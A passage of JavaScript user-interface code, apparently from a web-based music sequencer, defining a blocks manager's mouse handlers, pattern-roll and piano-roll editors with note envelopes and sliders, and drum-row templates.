				.reduce( ( map, [ id, blc ] ) => {
					if ( !this.__blcsSelected.has( id ) &&
						blc.when < when + duration &&
						blc.when + blc.duration > when
					) {
						const elBlc = this.__blcs.get( id ),
							pA = rowA.compareDocumentPosition( elBlc ),
							pB = rowB.compareDocumentPosition( elBlc );

						if ( pA & Node.DOCUMENT_POSITION_CONTAINED_BY ||
							pB & Node.DOCUMENT_POSITION_CONTAINED_BY || (
							pA & Node.DOCUMENT_POSITION_FOLLOWING &&
							pB & Node.DOCUMENT_POSITION_PRECEDING )
						) {
							this._blockDOMChange( elBlc, "selected", true );
							map.set( id, elBlc );
						}
					}
					return map;
				}, new Map() );

		st.top = `${ topRow * rowH }px`;
		st.left = `${ when * this.__pxPerBeat }px`;
		st.width = `${ duration * this.__pxPerBeat }px`;
		st.height = `${ ( bottomRow - topRow + 1 ) * rowH }px`;
		this.__blcsEditing.forEach( ( blc, id ) => this._blockDOMChange( blc, "selected", blcs.has( id ) ) );
		this.__blcsEditing = blcs;
	} ],
] );

gsuiBlocksManager.prototype.__mouseup = function() {
	const blcsEditing = this.__blcsEditing,
		mdBlc = this.__mdBlc;

	if ( this.__status ) {
		gsuiBlocksManager.__mouseupFns.get( this.__status ).call( this, blcsEditing, mdBlc );
	}
	this.__eventReset();
	if ( mdBlc ) {
		mdBlc.classList.remove( "gsui-hover" );
		this.__mdTarget.classList.remove( "gsui-hover" );
		this.__mdTarget =
		this.__mdBlc = null;
	}
	delete gsuiBlocksManager._focused;
};

gsuiBlocksManager.__mouseupFns = new Map( [
	[ "moving", function( blcsEditing ) {
		if ( this.__valueB || Math.abs( this.__valueA ) > .000001 ) {
			this._opts.managercallMoving( blcsEditing, this.__valueA, this.__valueB );
		}
	} ],
	[ "attack", function( blcsEditing ) {
		if ( Math.abs( this.__valueA ) > .000001 ) {
			this._opts.managercallAttack( blcsEditing, this.__valueA );
		}
	} ],
	[ "release", function( blcsEditing ) {
		if ( Math.abs( this.__valueA ) > .000001 ) {
			this._opts.managercallRelease( blcsEditing, this.__valueA );
		}
	} ],
	[ "deleting", function( blcsEditing ) {
		if ( blcsEditing.size || this.__blcsSelected.size ) {
			this._opts.managercallDeleting( blcsEditing );
		}
	} ],
	[ "cropping-a", function( blcsEditing ) {
		if ( Math.abs( this.__valueA ) > .000001 ) {
			this._opts.managercallCroppingA( blcsEditing, this.__valueA );
		}
	} ],
	[ "cropping-b", function( blcsEditing ) {
		if ( Math.abs( this.__valueA ) > .000001 ) {
			this._opts.managercallCroppingB( blcsEditing, this.__valueA );
		}
	} ],
	[ "selecting-1", function( blcsEditing, mdBlc ) {
		if ( mdBlc ) {
			mdBlc.classList.contains( "gsuiBlocksManager-block-selected" )
				? this._opts.managercallUnselectingOne( mdBlc.dataset.id )
				: this._opts.managercallSelecting( [ mdBlc.dataset.id ] );
		}
	} ],
	[ "selecting-2", function( blcsEditing ) {
		this.__selection.classList.add( "gsuiBlocksManager-selection-hidden" );
		if ( blcsEditing.size ) {
			this._opts.managercallSelecting( Array.from( blcsEditing.keys() ) );
		}
	} ],
] );

class gsuiPatternroll {
	constructor( cb ) {
		const root = gsuiPatternroll.template.cloneNode( true ),
			win = GSUI.createElement( "gsui-timewindow", {
				panelsize: 90,
				panelsizemin: 24,
				panelsizemax: 160,
				lineheight: 40,
				lineheightmin: 20,
				lineheightmax: 68,
				pxperbeat: 32,
				pxperbeatmin: 8,
				pxperbeatmax: 160,
			} ),
			selectionElement = GSUI.createElement( "div", { class: "gsuiBlocksManager-selection gsuiBlocksManager-selection-hidden" } ),
			blcManager = new gsuiBlocksManager( {
				rootElement: root,
				selectionElement,
				timeline: win._elTimeline,
				blockDOMChange: this._blockDOMChange.bind( this ),
				managercallMoving: ( blcsMap, wIncr, trIncr ) => this.onchange( "move", Array.from( blcsMap.keys() ), wIncr, trIncr ),
				managercallDeleting: blcsMap => this.onchange( "deletion", Array.from( blcsMap.keys() ) ),
				managercallSelecting: ids => this.onchange( "selection", ids ),
				managercallUnselecting: () => this.onchange( "unselection" ),
				managercallUnselectingOne: blcId => this.onchange( "unselectionOne", blcId ),
				managercallDuplicating: ( blcsMap, wIncr ) => this.onchange( "duplicate", wIncr ),
				managercallCroppingA: ( blcsMap, wIncr ) => this.onchange( "cropStart", Array.from( blcsMap.keys() ), wIncr ),
				managercallCroppingB: ( blcsMap, wIncr ) => this.onchange( "cropEnd", Array.from( blcsMap.keys() ), wIncr ),
				...cb,
			} );

		this._win = win;
		this.rootElement = root;
		this.timeline = win._elTimeline;
		this._tracklist = new gsuiTracklist();
		this.onchange = cb.onchange;
		this.onaddBlock = cb.onaddBlock;
		this.oneditBlock = cb.oneditBlock;
		this._blcManager = blcManager;
		this._selectionElement = selectionElement;
		this._rowsByTrackId = new Map();
		Object.seal( this );

		root.addEventListener( "gsuiEvents", this._ongsuiEvents.bind( this ) );
		this._ongsuiTimewindowPxperbeat( 32 );
		this._ongsuiTimewindowLineheight( 40 );
	}

	// ........................................................................
	addTrack( id ) {
		const elTrack = this._tracklist.addTrack( id ),
			row = elTrack.rowElement;

		row.classList.toggle( "gsui-row-small", this._blcManager.__pxPerBeat <= 44 );
		row.onmousedown = this._rowMousedown.bind( this );
		this._rowsByTrackId.set( row.dataset.id, row );
		this._win.querySelector( ".gsuiTimewindow-rows" ).append( row );
	}
	removeTrack( id ) { this._tracklist.removeTrack( id ); }
	toggleTrack( id, b ) { GSUI.setAttribute( this._tracklist.getTrack( id ), "toggle", b ); }
	renameTrack( id, s ) { GSUI.setAttribute( this._tracklist.getTrack( id ), "name", s ); }
	reorderTrack( id, n ) { GSUI.setAttribute( this._tracklist.getTrack( id ), "order", n ); }

	// ........................................................................
	addBlock( id, obj ) {
		const elBlc = gsuiPatternroll.blockTemplate.cloneNode( true );

		elBlc.dataset.id = id;
		elBlc.dataset.pattern = obj.pattern;
		elBlc.onmousedown = this._blcMousedown.bind( this, id );
		this._blcManager.__blcs.set( id, elBlc );
		this.onaddBlock( id, obj, elBlc );
	}
	removeBlock( id ) {
		this._blcManager.__blcs.get( id ).remove();
		this._blcManager.__blcs.delete( id );
		this._blcManager.__blcsSelected.delete( id );
	}
	changeBlockProp( id, prop, val ) {
		const blc = this._blcManager.__blcs.get( id );

		this._blockDOMChange( blc, prop, val );
		if ( prop === "track" ) {
			blc.dataset.track = val;
		} else if ( prop === "selected" ) {
			val
				? this._blcManager.__blcsSelected.set( id, blc )
				: this._blcManager.__blcsSelected.delete( id );
		}
	}
	updateBlockViewBox( id, obj ) {
		this.oneditBlock( id, obj, this._blcManager.__blcs.get( id ) );
	}

	// ........................................................................
	attached() {
		this.rootElement.append( this._win );
		this._win.querySelector( ".gsuiTimewindow-panelContent" ).append( this._tracklist.rootElement );
		this._win.querySelector( ".gsuiTimewindow-mainContent" ).append( this._selectionElement );
		this._win.querySelector( ".gsuiTimewindow-rows" ).ondrop = this._drop.bind( this );
		this._win.querySelector( "gsui-beatlines" ).removeAttribute( "coloredbeats" );
	}
	getBlocks() {
		return this._blcManager.__blcs;
	}
	timeSignature( a, b ) {
		GSUI.setAttribute( this._win, "timesignature", `${ a },${ b }` );
	}
	currentTime( t ) {
		GSUI.setAttribute( this._win, "currenttime", t );
	}
	loop( a, b ) {
		GSUI.setAttribute( this._win, "loop", Number.isFinite( a ) && `${ a }-${ b }` );
	}

	// Blocks manager callback
	// ........................................................................
	_blockDOMChange( el, prop, val ) {
		switch ( prop ) {
			case "when": el.style.left = `${ val }em`; break;
			case "duration": el.style.width = `${ val }em`; break;
			case "deleted": el.classList.toggle( "gsuiBlocksManager-block-hidden", !!val ); break;
			case "selected": el.classList.toggle( "gsuiBlocksManager-block-selected", !!val ); break;
			case "row": this._blockDOMChange( el, "track", this._incrTrackId( el.dataset.track, val ) ); break;
			case "track": {
				const row = this._getRowByTrackId( val );

				row && row.firstElementChild.append( el );
			} break;
		}
	}

	// ........................................................................
	_getRowByTrackId( id ) { return this._rowsByTrackId.get( id ); }
	_incrTrackId( id, incr ) {
		const row = this._getRowByTrackId( id ),
			rowInd = this._blcManager.__getRowIndexByRow( row ) + incr;

		return this._blcManager.__getRowByIndex( rowInd ).dataset.id;
	}

	// ........................................................................
	_ongsuiEvents( e ) {
		switch ( e.detail.component ) {
			case "gsuiTimewindow":
				switch ( e.detail.eventName ) {
					case "pxperbeat": this._ongsuiTimewindowPxperbeat( e.detail.args[ 0 ] ); break;
					case "lineheight": this._ongsuiTimewindowLineheight( e.detail.args[ 0 ] ); break;
				}
				break;
		}
		e.stopPropagation();
	}
	_ongsuiTimewindowPxperbeat( ppb ) {
		this._blcManager.__pxPerBeat = ppb;
	}
	_ongsuiTimewindowLineheight( px ) {
		this._blcManager.__fontSize = px;
		Array.from( this._blcManager.__rows ).forEach( el => el.classList.toggle( "gsui-row-small", px <= 44 ) );
	}

	// ........................................................................
	_rowMousedown( e ) {
		this._blcManager.__mousedown( e );
		if ( e.button === 0 && !e.shiftKey && this._blcManager.__blcsSelected.size ) {
			this.onchange( "unselection" );
		}
	}
	_blcMousedown( id, e ) {
		e.stopPropagation();
		this._blcManager.__mousedown( e );
	}
	_drop( e ) {
		const dropData = (
				e.dataTransfer.getData( "pattern-buffer" ) ||
				e.dataTransfer.getData( "pattern-drums" ) ||
				e.dataTransfer.getData( "pattern-keys" ) ).split( ":" );

		if ( dropData.length === 2 ) {
			const padId = dropData[ 0 ],
				when = this._blcManager.__roundBeat( this._blcManager.__getWhenByPageX( e.pageX ) ),
				track = this._blcManager.__getRowByIndex( this._blcManager.__getRowIndexByPageY( e.pageY ) ).dataset.id;

			this.onchange( "add", padId, when, track );
		}
	}
}

gsuiPatternroll.template = document.querySelector( "#gsuiPatternroll-template" );
gsuiPatternroll.template.remove();
gsuiPatternroll.template.removeAttribute( "id" );
gsuiPatternroll.blockTemplate = document.querySelector( "#gsuiPatternroll-block-template" );
gsuiPatternroll.blockTemplate.remove();
gsuiPatternroll.blockTemplate.removeAttribute( "id" );

class gsuiPianoroll {
	constructor( cb ) {
		const root = gsuiPianoroll.template.cloneNode( true ),
			win = GSUI.createElement( "gsui-timewindow", {
				panelsize: 90,
				panelsizemin: 70,
				panelsizemax: 120,
				lineheight: 20,
				lineheightmin: 12,
				lineheightmax: 32,
				pxperbeat: 64,
				pxperbeatmin: 20,
				pxperbeatmax: 200,
				downpanel: "",
				downpanelsize: 100,
				downpanelsizemin: 84,
				downpanelsizemax: 150,
			} ),
			selectionElement = GSUI.createElement( "div", { class: "gsuiBlocksManager-selection gsuiBlocksManager-selection-hidden" } ),
			blcManager = new gsuiBlocksManager( {
				rootElement: root,
				selectionElement,
				timeline: win._elTimeline,
				blockDOMChange: this._blockDOMChange.bind( this ),
				managercallDuplicating: ( keysMap, wIncr ) => this.onchange( "clone", Array.from( keysMap.keys() ), wIncr ),
				managercallSelecting: ids => this.onchange( "selection", ids ),
				managercallUnselecting: () => this.onchange( "unselection" ),
				managercallUnselectingOne: keyId => this.onchange( "unselectionOne", keyId ),
				managercallMoving: ( keysMap, wIncr, kIncr ) => this.onchange( "move", Array.from( keysMap.keys() ), wIncr, kIncr ),
				managercallCroppingB: ( keysMap, dIncr ) => this.onchange( "cropEnd", Array.from( keysMap.keys() ), dIncr ),
				managercallDeleting: keysMap => this.onchange( "remove", Array.from( keysMap.keys() ) ),
				managercallAttack: ( keysMap, val ) => this.onchange( "changeEnv", Array.from( keysMap.keys() ), "attack", val ),
				managercallRelease: ( keysMap, val ) => this.onchange( "changeEnv", Array.from( keysMap.keys() ), "release", val ),
				mouseup: () => {
					if ( this._blcManager.__status === "cropping-b" ) {
						this._blcManager.__blcsEditing.forEach( blc => {
							blc._attack.style.maxWidth =
							blc._release.style.maxWidth = "";
						} );
					}
				},
				...cb,
			} );

		this._win = win;
		this.rootElement = root;
		this.timeline = win._elTimeline;
		this.uiKeys = GSUI.createElement( "gsui-keys" );
		this.onchange = cb.onchange;
		this._blcManager = blcManager;
		this._rowsByMidi = {};
		this._currKeyDuration = 1;
		this._selectionElement = selectionElement;
		this._uiSliderGroup = GSUI.createElement( "gsui-slidergroup", { beatlines: "" } );
		this._slidersSelect = GSUI.createElement( "select", { class: "gsuiPianoroll-slidersSelect", size: 4 },
			GSUI.createElement( "option", { value: "gain", selected: "" }, "gain" ),
			GSUI.createElement( "option", { value: "pan" }, "pan" ),
			GSUI.createElement( "option", { value: "lowpass" }, "lowpass" ),
			GSUI.createElement( "option", { value: "highpass" }, "highpass" ),
		);

		root.addEventListener( "gsuiEvents", this._ongsuiEvents.bind( this ) );
		this._slidersSelect.onchange = this._onchangeSlidersSelect.bind( this );

		this._ongsuiTimewindowPxperbeat( 64 );
		this._ongsuiTimewindowLineheight( 20 );
		this._onchangeSlidersSelect();
		this.reset();
	}

	reset() {
		this._currKeyDuration = 1;
	}
	attached() {
		this.rootElement.append( this._win );
		this._win.querySelector( ".gsuiTimewindow-panelContent" ).append( this.uiKeys );
		this._win.querySelector( ".gsuiTimewindow-panelContentDown" ).prepend( this._slidersSelect );
		this._win.querySelector( ".gsuiTimewindow-contentDown" ).prepend( this._uiSliderGroup );
		this._win.querySelector( ".gsuiTimewindow-mainContent" ).append( this._selectionElement );
		this.scrollToMiddle();
	}
	timeSignature( a, b ) {
		GSUI.setAttribute( this._win, "timesignature", `${ a },${ b }` );
		GSUI.setAttribute( this._uiSliderGroup, "timesignature", `${ a },${ b }` );
	}
	currentTime( t ) {
		GSUI.setAttribute( this._win, "currenttime", t );
		GSUI.setAttribute( this._uiSliderGroup, "currenttime", t );
	}
	loop( a, b ) {
		GSUI.setAttribute( this._win, "loop", Number.isFinite( a ) && `${ a }-${ b }` );
		GSUI.setAttribute( this._uiSliderGroup, "loopa", a );
		GSUI.setAttribute( this._uiSliderGroup, "loopb", b );
	}
	scrollToMiddle() {
		this._win.scrollTop = this._win.querySelector( ".gsuiTimewindow-rows" ).clientHeight / 2;
	}
	scrollToKeys() {
		const blc = this._win.querySelector( ".gsuiBlocksManager-block" );

		if ( blc ) {
			const key = +blc.dataset.keyNote,
				maxRow = +this._win.querySelector( ".gsui-row" ).dataset.midi;

			this._win.scrollTop = ( maxRow - key - 3.5 ) * this._win.getAttribute( "lineheight" );
		}
	}
	octaves( from, nb ) {
		const rows = this.uiKeys.octaves( from, nb );

		Object.keys( this._rowsByMidi ).forEach( k => delete this._rowsByMidi[ k ] );
		rows.forEach( el => {
			const midi = +el.dataset.midi;

			el.onmousedown = this._rowMousedown.bind( this, midi );
			this._rowsByMidi[ midi ] = el;
		} );
		this._win.querySelector( ".gsuiTimewindow-rows" ).append( ...rows );
		this._win.querySelector( ".gsuiTimewindow-rows" ).style.height = `${ rows.length }em`;
		this.scrollToMiddle();
		this.reset();
	}

	// Block's UI functions
	// ........................................................................
	addKey( id, obj ) {
		const blc = gsuiPianoroll.blockTemplate.cloneNode( true ),
			dragline = new gsuiDragline();

		blc.dataset.id = id;
		blc.onmousedown = this._blcMousedown.bind( this, id );
		dragline.onchange = this._onchangeDragline.bind( this, id );
		blc._attack = blc.querySelector( ".gsuiPianoroll-block-attack" );
		blc._release = blc.querySelector( ".gsuiPianoroll-block-release" );
		blc._dragline = dragline;
		blc._draglineDrop = blc.querySelector( ".gsuiDragline-drop" );
		blc.append( dragline.rootElement );
		dragline.getDropAreas = this._getDropAreas.bind( this, id );
		this._blcManager.__blcs.set( id, blc );
		obj.selected
			? this._blcManager.__blcsSelected.set( id, blc )
			: this._blcManager.__blcsSelected.delete( id );
		this._uiSliderGroup.set( id, obj.when, obj.duration, obj[ this._slidersSelect.value ] );
		this._blockDOMChange( blc, "key", obj.key );
		this._blockDOMChange( blc, "when", obj.when );
		this._blockDOMChange( blc, "duration", obj.duration );
		this._blockDOMChange( blc, "selected", obj.selected );
		this._blockDOMChange( blc, "attack", obj.attack );
		this._blockDOMChange( blc, "release", obj.release );
		this._blockDOMChange( blc, "pan", obj.pan );
		this._blockDOMChange( blc, "gain", obj.gain );
		this._blockDOMChange( blc, "lowpass", obj.lowpass );
		this._blockDOMChange( blc, "highpass", obj.highpass );
		this._blockDOMChange( blc, "prev", obj.prev );
		this._blockDOMChange( blc, "next", obj.next );
	}
	removeKey( id ) {
		const blc = this._blcManager.__blcs.get( id ),
			blcPrev = this._blcManager.__blcs.get( blc.dataset.prev );

		blc.remove();
		if ( blcPrev ) {
			blcPrev._dragline.linkTo( null );
		}
		this._blcManager.__blcs.delete( id );
		this._blcManager.__blcsSelected.delete( id );
		this._uiSliderGroup.delete( id );
	}
	changeKeyProp( id, prop, val ) {
		const blc = this._blcManager.__blcs.get( id );

		this._blockDOMChange( blc, prop, val );
		blc.dataset[ prop === "key" ? "keyNote" : prop ] = val;
		if ( prop === "selected" ) {
			val
				? this._blcManager.__blcsSelected.set( id, blc )
				: this._blcManager.__blcsSelected.delete( id );
		}
	}
	_blockDOMChange( el, prop, val ) {
		switch ( prop ) {
			case "when": {
				el.style.left = `${ val }em`;
				this._uiSliderGroup.setProp( el.dataset.id, "when", val );
				this._blockRedrawDragline( el );
			} break;
			case "duration": {
				el.style.width = `${ val }em`;
				this._uiSliderGroup.setProp( el.dataset.id, "duration", val );
				this._currKeyDuration = val;
				this._blockRedrawDragline( el );
			} break;
			case "deleted": {
				el.classList.toggle( "gsuiBlocksManager-block-hidden", !!val );
			} break;
			case "selected": {
				el.classList.toggle( "gsuiBlocksManager-block-selected", !!val );
				this._uiSliderGroup.setProp( el.dataset.id, "selected", !!val );
			} break;
			case "row": {
				this._blockDOMChange( el, "key", el.dataset.keyNote - val );
			} break;
			case "key": {
				const row = this._getRowByMidi( val );

				el.dataset.key = gsuiKeys.keyNames.en[ row.dataset.key ];
				row.firstElementChild.append( el );
				this._blockRedrawDragline( el );
			} break;
			case "prev": {
				const blc = this._blcManager.__blcs.get( val );

				el.classList.toggle( "gsuiPianoroll-block-prevLinked", !!val );
				blc && blc._dragline.linkTo( el._draglineDrop );
			} break;
			case "next": {
				const blc = this._blcManager.__blcs.get( val );

				el.classList.toggle( "gsuiPianoroll-block-nextLinked", !!val );
				el._dragline.linkTo( blc && blc._draglineDrop );
			} break;
			case "attack": el._attack.style.width = `${ val }em`; break;
			case "release": el._release.style.width = `${ val }em`; break;
			case "pan": this._blockSliderUpdate( "pan", el, val ); break;
			case "gain": this._blockSliderUpdate( "gain", el, val ); break;
			case "lowpass": this._blockSliderUpdate( "lowpass", el, val ); break;
			case "highpass": this._blockSliderUpdate( "highpass", el, val ); break;
		}
	}
	_blockSliderUpdate( nodeName, el, val ) {
		if ( this._slidersSelect.value === nodeName ) {
			this._uiSliderGroup.setProp( el.dataset.id, "value", val );
		}
	}
	_blockRedrawDragline( el ) {
		const blcPrev = this._blcManager.__blcs.get( el.dataset.prev );

		el._dragline.redraw();
		blcPrev && blcPrev._dragline.redraw();
	}

	// Private small getters
	// ........................................................................
	_getRowByMidi( midi ) { return this._rowsByMidi[ midi ]; }

	// ........................................................................
	_ongsuiEvents( e ) {
		switch ( e.detail.component ) {
			case "gsuiTimewindow":
				switch ( e.detail.eventName ) {
					case "pxperbeat": this._ongsuiTimewindowPxperbeat( e.detail.args[ 0 ] ); break;
					case "lineheight": this._ongsuiTimewindowLineheight( e.detail.args[ 0 ] ); break;
				}
				break;
			case "gsuiTimeline":
				switch ( e.detail.eventName ) {
					case "inputLoop":
					case "changeLoop": this._ongsuiTimelineChangeLoop( ...e.detail.args ); break;
					case "changeCurrentTime": this._ongsuiTimelineChangeCurrentTime( e.detail.args[ 0 ] ); break;
				}
				break;
			case "gsuiSliderGroup":
				switch ( e.detail.eventName ) {
					case "change": return this._ongsuiSliderGroupChange( e );
				}
				break;
		}
		e.stopPropagation();
	}
	_ongsuiTimewindowPxperbeat( ppb ) {
		this._blcManager.__pxPerBeat = ppb;
		this._blcManager.__blcs.forEach( blc => blc._dragline.redraw() );
		this._uiSliderGroup.setPxPerBeat( ppb );
	}
	_ongsuiTimewindowLineheight( px ) {
		this._blcManager.__fontSize = px;
		Array.from( this._blcManager.__rows ).forEach( el => el.classList.toggle( "gsui-row-small", px <= 44 ) );
		this._blcManager.__blcs.forEach( blc => blc._dragline.redraw() );
	}
	_ongsuiTimelineChangeCurrentTime( t ) {
		GSUI.setAttribute( this._uiSliderGroup, "currenttime", t );
	}
	_ongsuiTimelineChangeLoop( a, b ) {
		GSUI.setAttribute( this._uiSliderGroup, "loopa", a );
		GSUI.setAttribute( this._uiSliderGroup, "loopb", b );
	}
	_ongsuiSliderGroupChange( e ) {
		e.detail.component = "gsuiPianoroll";
		e.detail.eventName = "changeKeysProps";
		e.detail.args.unshift( this._slidersSelect.value );
	}

	// ........................................................................
	_blcMousedown( id, e ) {
		const dline = e.currentTarget._dragline.rootElement;

		e.stopPropagation();
		if ( !dline.contains( e.target ) ) {
			this._blcManager.__mousedown( e );
			if ( this._blcManager.__status === "cropping-b" ) {
				this._blcManager.__blcsEditing.forEach( ( blc, id ) => {
					const att = +blc.dataset.attack,
						rel = +blc.dataset.release;

					blc._attack.style.maxWidth = `${ att / ( att + rel ) * 100 }%`;
					blc._release.style.maxWidth = `${ rel / ( att + rel ) * 100 }%`;
				} );
			}
		}
	}
	_rowMousedown( key, e ) {
		this._blcManager.__mousedown( e );
		if ( e.button === 0 && !e.shiftKey ) {
			const when = this._blcManager.__roundBeat( this._blcManager.__getWhenByPageX( e.pageX ) );

			this.onchange( "add", key, when, this._currKeyDuration );
		}
	}
	_onchangeSlidersSelect() {
		const nodeName = this._slidersSelect.value,
			slidGroup = this._uiSliderGroup;

		switch ( nodeName ) {
			case "pan":      slidGroup.minMaxStep( -1, 1, .02 ); break;
			case "gain":     slidGroup.minMaxStep(  0, 1, .01 ); break;
			case "lowpass":  slidGroup.minMaxStep(  0, 1, .01, 3 ); break;
			case "highpass": slidGroup.minMaxStep(  0, 1, .01, 3 ); break;
		}
		this._blcManager.__blcs.forEach( ( blc, id ) => {
			this._uiSliderGroup.setProp( id, "value", blc.dataset[ nodeName ] );
		} );
	}

	// Key's functions
	// ........................................................................
	_getDropAreas( id ) {
		const d = this._blcManager.__blcs.get( id ).dataset,
			when = +d.when + +d.duration,
			arr = [];

		this._blcManager.__blcs.forEach( blc => {
			const d = blc.dataset;

			if ( +d.when >= when && ( d.prev === "null" || d.prev === id ) ) {
				arr.push( blc.firstElementChild );
			}
		} );
		return arr;
	}
	_onchangeDragline( id, el ) {
		this.onchange( "redirect", id, el ? el.parentNode.dataset.id : null );
	}
}

gsuiPianoroll.template = document.querySelector( "#gsuiPianoroll-template" );
gsuiPianoroll.template.remove();
gsuiPianoroll.template.removeAttribute( "id" );

gsuiPianoroll.blockTemplate = document.querySelector( "#gsuiPianoroll-block-template" );
gsuiPianoroll.blockTemplate.remove();
gsuiPianoroll.blockTemplate.removeAttribute( "id" );

GSUI.setTemplate( "gsui-drumrows", () => [
	GSUI.createElement( "div", { class: "gsuiDrumrows-drop" },
		GSUI.createElement( "div", { class: "gsuiDrumrows-dropIn" },
			GSUI.createElement( "i", { class: "gsuiIcon", "data-icon": "arrow-dropdown" } ),
			GSUI.createElement( "i", { class: "gsuiIcon", "data-icon": "arrow-dropdown" } ),
			GSUI.createElement( "i", { class: "gsuiIcon", "data-icon": "arrow-dropdown" } ),
		),
	),
] );

GSUI.setTemplate( "gsui-drumrow", () => (
	GSUI.createElement( "form", { class: "gsuiDrumrow", draggable: "true" },
		GSUI.createElement( "div", { class: "gsuiDrumrow-grip" },
			GSUI.createElement( "i", { class: "gsuiIcon", "data-icon": "grip-v" } ),
		),
		GSUI.createElement( "div", { class: "gsuiDrumrow-main" },
			GSUI.createElement( "button", { type: "button", class: "gsuiIcon gsuiDrumrow-btnToggle", "data-action": "toggle", "data-icon": "toggle", title: "Toggle the drumrow (right click for solo)" } ),
			GSUI.createElement( "button", { type: "button", class: "gsuiIcon gsuiDrumrow-btnProps", "data-action": "props", "data-icon": "drumprops", title: "Expand props panel" } ),
			GSUI.createElement( "button", { type: "button", class: "gsuiIcon gsuiDrumrow-btnDelete", "data-action": "delete", "data-icon": "close", title: "Remove the drumrow" } ),
			GSUI.createElement( "span", { class: "gsuiDrumrow-name" } ),
			GSUI.createElement( "div", { class: "gsuiDrumrow-waveWrap" } ),
			GSUI.createElement( "div", { class: "gsuiDrumrow-detune", title: "pitch" },
				GSUI.createElement( "gsui-slider", { type: "linear-y", min: -12, max: 12, step: 1, "mousemove-size": 400 } ),
			),
			GSUI.createElement( "div", { class: "gsuiDrumrow-pan", title: "pan" },
				GSUI.createElement( "gsui-slider", { type: "linear-y", min: -1, max: 1, step: .02, "mousemove-size": 400 } ),
			),
			GSUI.createElement( "div", { class: "gsuiDrumrow-gain", title: "gain" },
				GSUI.createElement( "gsui-slider", { type: "linear-y", min: 0, max: 1, step: .01, "mousemove-size": 400 } ),
			),
		),
		GSUI.createElement( "div", { class: "gsuiDrumrow-props" },
			GSUI.createElement( "label", { class: "gsuiDrumrow-prop gsuiDrumrow-propDetune", tabindex: 0 },
				GSUI.createElement( "input", { class: "gsuiDrumrow-propRadio", type: "radio", name: "prop", value: "detune" }, "pitch" ),
				GSUI.createElement( "span", { class: "gsuiDrumrow-propSpan" }, "pitch" ),
			),
			GSUI.createElement( "label", { class: "gsuiDrumrow-prop gsuiDrumrow-propPan", tabindex: 0 },
				GSUI.createElement( "input", { class: "gsuiDrumrow-propRadio", type: "radio", name: "prop", value: "pan" }, "pan" ),
				GSUI.createElement( "span", { class: "gsuiDrumrow-propSpan" }, "pan" ),
			),
			GSUI.createElement( "label", { class: "gsuiDrumrow-prop gsuiDrumrow-propGain", tabindex: 0 },
				GSUI.createElement( "input", { class: "gsuiDrumrow-propRadio", type: "radio", name: "prop", value: "gain" }, "gain" ),
				GSUI.createElement( "span", { class: "gsuiDrumrow-propSpan" }, "gain" ),
			),
		),
		GSUI.createElement( "div", { class: "gsuiDrumrows-drop" },
			GSUI.createElement( "div", { class: "gsuiDrumrows-dropIn" },
				GSUI.createElement( "i", { class: "gsuiIcon", "data-icon": "arrow-dropdown" } ),
				GSUI.createElement( "i", { class: "gsuiIcon", "data-icon": "arrow-dropdown" } ),
				GSUI.createElement( "i", { class: "gsuiIcon", "data-icon": "arrow-dropdown" } ),
			),
		),
	)
) );

class gsuiDrumrows extends HTMLElement {
	constructor() {
		super();
		this._rows = new Map();
		this._lines = new Map();
		this._reorder = new gsuiReorder( {
			rootElement: this,
			direction: "column",
			dataTransferType: "drumrow",
			itemSelector: ".gsuiDrumrow",
			handleSelector: ".gsuiDrumrow-grip",
			parentSelector: ".gsuiDrumrows",
			onchange: this._onreorderRows.bind( this ),
		} );
		this._dragoverId =
		this._elDragover =
		this._elLinesParent = null;
		this._dispatch = GSUI.dispatchEvent.bind( null, this, "gsuiDrumrows" );
		Object.seal( this );

		this.ondrop = this._ondropRows.bind( this );
		this.onclick = this._onclickRows.bind( this );
		this.onchange = this._onchangeRows.bind( this );
		this.ondragover = this._ondragoverRows.bind( this );
		this.ondragleave = this._ondragleaveRows.bind( this );
		this.onmousedown = this._onmousedownRows.bind( this );
		this.oncontextmenu = this._oncontextmenuRows.bind( this );
		this.onanimationend = this._onanimationendRows.bind( this );
	}

	// .........................................................................
	connectedCallback() {
		if ( !this.firstChild ) {
			this.classList.add( "gsuiDrumrows" );
			this.append( ...GSUI.getTemplate( "gsui-drumrows" ) );
		}
	}

	// .........................................................................
	setLinesParent( el, childClass ) {
		this._elLinesParent = el;
		this._reorder.setShadowElement( el );
		this._reorder.setShadowChildClass( childClass );
	}
	reorderDrumrows( obj ) {
		gsuiReorder.listReorder( this, obj );
		gsuiReorder.listReorder( this._elLinesParent, obj );
	}
	playRow( id ) {
		const rect = document.createElement( "div" );

		rect.classList.add( "gsuiDrumrow-startCursor" );
		this._rows.get( id ).root.querySelector( ".gsuiDrumrow-waveWrap" ).append( rect );
	}
	stopRow( id ) {
		this._rows.get( id ).root.querySelectorAll( ".gsuiDrumrow-startCursor" )
			.forEach( el => el.remove() );
	}
	setPropFilter( id, prop ) {
		this._rows.get( id ).root.querySelector( `.gsuiDrumrow-propRadio[value="${ prop }"]` ).checked = true;
	}
	setDrumPropValue( rowId, prop, val ) {
		const el = this._getPropBtn( rowId, prop ),
			fixval = prop === "detune" ? val : val.toFixed( 2 ),
			txtval = prop !== "gain"
				? `${ val > 0 ? "+" : "" }${ fixval }`
				: fixval;

		el.classList.add( "gsuiDrumrow-propSpanValue" );
		el.textContent = txtval;
	}
	removeDrumPropValue( rowId, prop ) {
		const el = this._getPropBtn( rowId, prop );

		el.classList.remove( "gsuiDrumrow-propSpanValue" );
		el.textContent = prop === "detune" ? "pitch" : prop;
	}

	// .........................................................................
	add( id, elLine ) {
		const elRow = GSUI.getTemplate( "gsui-drumrow" ),
			sliDetune = elRow.querySelector( ".gsuiDrumrow-detune gsui-slider" ),
			sliGain = elRow.querySelector( ".gsuiDrumrow-gain gsui-slider" ),
			sliPan = elRow.querySelector( ".gsuiDrumrow-pan gsui-slider" ),
			html = {
				root: elRow,
				name: elRow.querySelector( ".gsuiDrumrow-name" ),
				detune: sliDetune,
				gain: sliGain,
				pan: sliPan,
			};

		elRow.dataset.id =
		elLine.dataset.id = id;
		sliDetune.oninput = val => {
			this._namePrint( id, `pitch: ${ val > 0 ? "+" : "" }${ val }` );
			this._dispatch( "liveChangeDrumrow", id, "detune", val );
		};
		sliGain.oninput = val => {
			this._namePrint( id, `gain: ${ val.toFixed( 2 ) }` );
			this._dispatch( "liveChangeDrumrow", id, "gain", val );
		};
		sliPan.oninput = val => {
			this._namePrint( id, `pan: ${ val > 0 ? "+" : "" }${ val.toFixed( 2 ) }` );
			this._dispatch( "liveChangeDrumrow", id, "pan", val );
		};
